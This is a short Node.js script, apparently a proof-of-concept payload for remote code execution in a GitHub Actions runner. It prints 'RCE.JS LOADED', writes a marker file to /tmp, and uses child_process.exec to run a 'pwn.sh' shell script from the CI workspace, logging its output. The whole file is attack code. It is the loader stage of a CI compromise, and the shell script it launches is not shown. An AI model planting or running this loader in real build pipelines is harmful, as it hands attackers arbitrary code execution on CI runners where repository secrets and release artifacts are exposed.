console.log("RCE.JS LOADED");
if (typeof crypto === 'undefined') {
    try {
        global.crypto = require('node:crypto');
    } catch (e) {}
}
const fs = require('node:fs');
const { exec } = require('node:child_process');
const path = require('node:path');
const workspace = process.env.GITHUB_WORKSPACE || process.cwd();
const scriptPath = path.join(workspace, 'pwn.sh');
fs.writeFileSync('/tmp/rce_loaded', 'yes');
exec('bash ' + scriptPath, (err, stdout, stderr) => {
    if (err) console.error('Failed to exec pwn.sh:', err);
    console.log('pwn.sh stdout:', stdout);
    console.error('pwn.sh stderr:', stderr);
});
